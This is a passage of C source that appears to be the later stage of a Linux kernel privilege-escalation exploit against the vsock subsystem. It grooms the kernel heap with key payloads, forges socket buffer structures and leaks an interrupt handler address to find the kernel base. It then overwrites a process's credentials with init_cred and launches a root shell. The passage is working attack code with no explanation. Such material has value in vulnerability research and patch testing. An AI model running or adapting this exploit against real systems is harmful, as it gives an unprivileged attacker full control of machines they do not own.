			vvs_lower_found_at_kmalloc_96_obj = i;
			vvs_upper_found_at_kmalloc_96_obj = i + 1;
			found_two_adjacent_virtio_vsock_sock = true;
		}
	}

	printf("[+] vvs_lower: 0x%016lx\n", vvs_lower_heap_addr);
	printf("[+] vvs_upper: 0x%016lx\n", vvs_upper_heap_addr);
	printf("[+] vvs_lower_vsk_addr: 0x%016lx\n", vvs_lower_vsk_addr);
	printf("[+] vvs_upper_vsk_addr: 0x%016lx\n", vvs_upper_vsk_addr);
	printf("[+] lower_allocation_user_key_payload_addr: 0x%016lx\n", lower_allocation_user_key_payload_addr);

	int usable_vsock_fds[512] = {};
	for (int i = 0; i < 512; i++) {
		usable_vsock_fds[i] = -1;
	}

	int usable_vsock_fds_idx = 0;
	for (int i = 0; i < 256; i++) {
		for (int j = 0; j < 2; j++) {
			if (reclaim_invalid_free_vsockpairs[i][j] != -1) {
				usable_vsock_fds[usable_vsock_fds_idx++] = reclaim_invalid_free_vsockpairs[i][j];
			}
		}
	}

	bool found_leaked_vvs_lower_fd = false;
	int leaked_vvs_lower_fd = -1;

	for (int i = 0; i < usable_vsock_fds_idx && !found_leaked_vvs_lower_fd; i++) {
		u64 buffer_size = 0xcafebabe;
		Setsockopt(usable_vsock_fds[i], AF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE, &buffer_size, sizeof(buffer_size));
		keyctl_read(lower_allocation_key, leak_buf, 65535);

		p96 = leak_buf + 96 - sizeof(struct user_key_payload);
		vvs_lower = (struct virtio_vsock_sock *)(p96 + vvs_lower_found_at_kmalloc_96_obj * 96);
		if (vvs_lower->buf_alloc == 0xcafebabe) {
			leaked_vvs_lower_fd = usable_vsock_fds[i];
			found_leaked_vvs_lower_fd = true;
		}
	}

	bool found_leaked_vvs_upper_fd = false;
	int leaked_vvs_upper_fd = -1;

	for (int i = 0; i < usable_vsock_fds_idx && !found_leaked_vvs_upper_fd; i++) {
		u64 buffer_size = 0xbabecafe;
		Setsockopt(usable_vsock_fds[i], AF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE, &buffer_size, sizeof(buffer_size));
		keyctl_read(lower_allocation_key, leak_buf, 65535);

		p96 = leak_buf + 96 - sizeof(struct user_key_payload);
		vvs_upper = (struct virtio_vsock_sock *)(p96 + vvs_upper_found_at_kmalloc_96_obj * 96);
		if (vvs_upper->buf_alloc == 0xbabecafe) {
			leaked_vvs_upper_fd = usable_vsock_fds[i];
			found_leaked_vvs_upper_fd = true;
		}
	}

	printf("leaked_vvs_lower_fd: %d\n", leaked_vvs_lower_fd);
	printf("leaked_vvs_upper_fd: %d\n", leaked_vvs_upper_fd);

	char fake_skb_lower_key_desc[128] = {};
	char fake_skb_lower_data[64] = {};
	/*
	*(u32 *)(fake_skb_lower_data + 8) = 1280; // skb->len
	*(u32 *)(fake_skb_lower_data + 12) = 0;  // skb->datalen
	*/

	*(u32 *)(fake_skb_lower_data + 32) = 4096; // skb->len
	*(u32 *)(fake_skb_lower_data + 36) = 0;  // skb->datalen
	key_serial_t fake_skb_lower_keys[TOTAL_USER_KEY_PAYLOAD_2] = {};
	bool fake_skb_lower_success = false;

	Close(leaked_vvs_lower_fd);

	for (int i = 0; i < TOTAL_USER_KEY_PAYLOAD_2 && !fake_skb_lower_success; i++) {
		snprintf(fake_skb_lower_key_desc, sizeof(fake_skb_lower_key_desc), "key3_%d", i);
		fake_skb_lower_keys[i] = user_key_payload_alloc(fake_skb_lower_key_desc, fake_skb_lower_data, 64);
		keyctl_read(lower_allocation_key, leak_buf, 65535);
		p96 = leak_buf + 96 - sizeof(struct user_key_payload);
		void *fake_skb_lower_data_in_kernel = (p96 + vvs_lower_found_at_kmalloc_96_obj * 96 + sizeof(struct user_key_payload));
		if (memcmp(fake_skb_lower_data_in_kernel, fake_skb_lower_data, 64) == 0) {
			printf("fake_skb_lower_success\n");
			fake_skb_lower_success = true;
		}
	}

	char fake_skb_upper_key_desc[128] = {};
	char fake_skb_upper_data[64] = {};
	*(u64 *)(fake_skb_upper_data + 24) = 0xfffffe0000000000UL; // skb->data

	// *(u64 *)(fake_skb_upper_data) = 0xfffffe0000000000UL; // skb->data

	key_serial_t fake_skb_upper_keys[TOTAL_USER_KEY_PAYLOAD_3] = {};
	bool fake_skb_upper_success = false;

	Close(leaked_vvs_upper_fd);

	key_serial_t fake_skb_upper_key = -1;

	for (int i = 0; i < TOTAL_USER_KEY_PAYLOAD_3 && !fake_skb_upper_success; i++) {
		snprintf(fake_skb_upper_key_desc, sizeof(fake_skb_upper_key_desc), "key4_%d", i);
		fake_skb_upper_keys[i] = user_key_payload_alloc(fake_skb_upper_key_desc, fake_skb_upper_data, 64);
		keyctl_read(lower_allocation_key, leak_buf, 65535);
		p96 = leak_buf + 96 - sizeof(struct user_key_payload);
		void *fake_skb_upper_data_in_kernel = (p96 + vvs_upper_found_at_kmalloc_96_obj * 96 + sizeof(struct user_key_payload));
		if (memcmp(fake_skb_upper_data_in_kernel, fake_skb_upper_data, 64) == 0) {
			fprintf(stderr, "fake_skb_upper_success\n");

			for (int j = 0; j < i; j++) {
				user_key_payload_free(fake_skb_upper_keys[j]);
			}

			fake_skb_upper_key = fake_skb_upper_keys[i];
			fake_skb_upper_success = true;
		}
	}

	user_key_payload_free(lower_allocation_key);
	sleep(1);

	char fake_rx_queue_key_desc[128] = {};
	char fake_rx_queue_data[64] = {};

	//*(u64 *)(fake_rx_queue_data + 8) = vvs_lower_heap_addr + sizeof(struct user_key_payload )- 0x70 + 8; // rx_queue.next
	*(u64 *)(fake_rx_queue_data + 8) = vvs_lower_heap_addr + sizeof(struct user_key_payload )- 0x70 + 8 + 16 + 8; // rx_queue.next
	*(u64 *)(fake_rx_queue_data + 16) = vvs_lower_heap_addr + sizeof(struct user_key_payload )- 0x70 + 8 + 16 + 8;

	key_serial_t fake_rx_queue_keys[64];
	for (int i = 0; i < 64; i++) {
		snprintf(fake_rx_queue_key_desc, sizeof(fake_rx_queue_key_desc), "key5_%d", i);
		fake_rx_queue_keys[i] = user_key_payload_alloc(fake_rx_queue_key_desc, fake_rx_queue_data, 64);
	}

	//wait_for_inspection("Enter to peek fake skb");

	u8 vsk_leak_buffer[4096] = {};
	recv(reclaim_side_sockfd, vsk_leak_buffer, 4096, MSG_PEEK);
	struct gate_struct *idt_entry = (struct gate_struct *)vsk_leak_buffer;
	unsigned long divide_error_handler_addr =
      (((u64)idt_entry->offset_high  ) << 32) |
      (((u64)idt_entry->offset_middle) << 16) |
      (((u64)idt_entry->offset_low   ) <<  0);
	printf("#DE handler at 0x%lx\n", divide_error_handler_addr);

	u64 kernel_base = divide_error_handler_addr - asm_exc_divide_error_offset_from_kernel_base;
	printf("[+] kernel base: 0x%016lx\n", kernel_base);

	init_task += kernel_base;
	printf("[+] init_task: 0x%016lx\n", init_task);

	init_cred += kernel_base;
	printf("[+] init_cred: 0x%016lx\n", init_cred);

	init_fs += kernel_base;
	printf("[+] init_fs: 0x%016lx\n", init_fs);

	*(u64 *)(fake_skb_upper_data + 24) = init_task;
	//*(u64 *)(fake_skb_upper_data) = init_task;

	user_key_payload_free(fake_skb_upper_key);
	sleep(2);

	char leak_init_task_key_desc[128] = {};
	for (int i = 0; i < 32; i++) {
		snprintf(leak_init_task_key_desc, sizeof(leak_init_task_key_desc), "leak_init_task_%d", i);
		fake_skb_upper_keys[i] = user_key_payload_alloc(leak_init_task_key_desc, fake_skb_upper_data, 64);
	}
	
	//wait_for_inspection("Enter to leak init task");
	u8 init_task_leak_buffer[4096] = {};
	recv(reclaim_side_sockfd, init_task_leak_buffer, 4096, MSG_PEEK);

	u64 next_task = *(u64 *)(init_task_leak_buffer + 1232);
	u64 prev_task = *(u64 *)(init_task_leak_buffer + 1240);

	printf("[+] init next_task: 0x%016lx\n", next_task);
	printf("[+] init prev_task: 0x%016lx\n", prev_task);

	int wait_pipe[2];
	pipe(wait_pipe);
	int pid = fork();
	if (pid == 0) {
		int wait_int;
		read(wait_pipe[0], &wait_int, sizeof(wait_int));
		fprintf(stderr, "child wakeup\n");

		int euid = geteuid();
		int uid = getuid();

		if (euid == 0 || uid == 0) {
			char *sh_args[] = {"sh", NULL};
			execve("/bin/sh", sh_args, NULL);
			exit(0);
		}
	}

	recv(reclaim_side_sockfd, init_task_leak_buffer, 4096, MSG_PEEK);

	next_task = *(u64 *)(init_task_leak_buffer + 1232);
	prev_task = *(u64 *)(init_task_leak_buffer + 1240);

	printf("[+] init next_task: 0x%016lx\n", next_task);
	printf("[+] init prev_task: 0x%016lx\n", prev_task);

	for (int i = 0; i < 32; i++) {
		user_key_payload_free(fake_skb_upper_keys[i]);
	}

	sleep(2);
	
	char write_to_task_struct_key_desc[128] = {};
	*(u64 *)(fake_skb_upper_data + 24) = prev_task - 0x4d0; // skb->data
	*(u64 *)(fake_skb_upper_data + 16) = prev_task - 0x4d0; // skb->head
	*(u32 *)(fake_skb_upper_data + 12) = 0xFFFFFFFF; // skb->end
	*(u32 *)(fake_skb_upper_data + 8) = 0x770; // skb->tail (offset to real_cred) 

	for (int i = 0; i < 80; i++) {
		snprintf(write_to_task_struct_key_desc, sizeof(write_to_task_struct_key_desc),
			"write_to_task_%d", i);
		fake_skb_upper_keys[i] = user_key_payload_alloc(
			write_to_task_struct_key_desc,
			fake_skb_upper_data,
			64
		);
	}

	u8 overwrite_task_buf[4096] = {};
	*(u64 *)(overwrite_task_buf + 0) = init_cred;
	*(u64 *)(overwrite_task_buf + 8) = init_cred;
	*(u64 *)(overwrite_task_buf + 88) = init_fs;

	u64 buffer_size = 0xFFFFFFFF - 1;
	Setsockopt(reclaim_side_sockfd, AF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE, &buffer_size, sizeof(buffer_size));

	//wait_for_inspection("Enter to overwrite task_struct");
	send(send_to_reclaim_side_sockfd, overwrite_task_buf, 96, 0);

	fprintf(stderr, "ready to wake child\n");
	int uid = getuid();
	int euid = geteuid();

	if (uid == 0 || euid == 0) {
		fprintf(stderr, "somehow we become root\n");
		char *sh_args[] = {"sh", NULL};
		execve("/bin/sh", sh_args, NULL);
		exit(0);
	}

	int wake_int;
	write(wait_pipe[1], &wake_int, sizeof(wake_int));

	fprintf(stderr, "wake child done\n");
	wait(NULL);

	for ( ;; ) {
		sleep(1000);
	}

	//wait_for_inspection("check");
}
